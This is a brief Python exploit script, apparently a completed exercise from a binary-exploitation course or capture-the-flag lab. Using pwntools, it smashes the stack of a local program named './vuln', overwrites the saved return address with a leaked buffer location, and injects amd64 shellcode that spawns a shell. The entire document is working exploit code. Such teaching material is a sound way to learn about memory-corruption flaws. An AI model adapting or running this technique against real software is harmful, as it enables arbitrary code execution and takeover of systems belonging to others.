from pwn import *

p = process('./vuln')

ret_offset = 72
buf_addr = int(p.readline().rstrip()[17:], 16)
ret_address = buf_addr+ret_offset+8 # Convenient shellcode location
payload = b''

# Garbage
payload += ret_offset * b'A'

# TODO Overwrite ret_address, taking endianness into account
payload += p64(ret_address)

# TODO Assemble a shellcode from 'shellcraft' and append to payload
context.arch = 'amd64'
context.os = 'linux'
shellcode = shellcraft.sh()
payload += asm(shellcode)

# Send payload
p.sendline(payload)

# Enjoy shell :-)
p.interactive()
